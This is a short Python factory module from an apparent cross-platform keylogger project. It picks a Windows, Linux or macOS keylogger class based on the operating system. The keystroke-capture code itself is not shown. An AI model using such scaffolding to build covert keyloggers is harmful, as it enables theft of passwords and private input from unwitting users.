import platform
from .interfaces import IKeyLogger
from .windows_keylogger import WindowsKeyLogger
from .linux_keylogger import LinuxKeyLogger
from .mac_keylogger import MacKeyLogger

class KeyLoggerFactory:
    @staticmethod
    def create_keylogger() -> IKeyLogger:
        system = platform.system().lower()
        
        if system == 'windows':
            return WindowsKeyLogger()
        elif system == 'linux':
            return LinuxKeyLogger()
        elif system == 'darwin':  # MacOS
            return MacKeyLogger()
        else:
            raise NotImplementedError(f"No keylogger implementation for {system}") 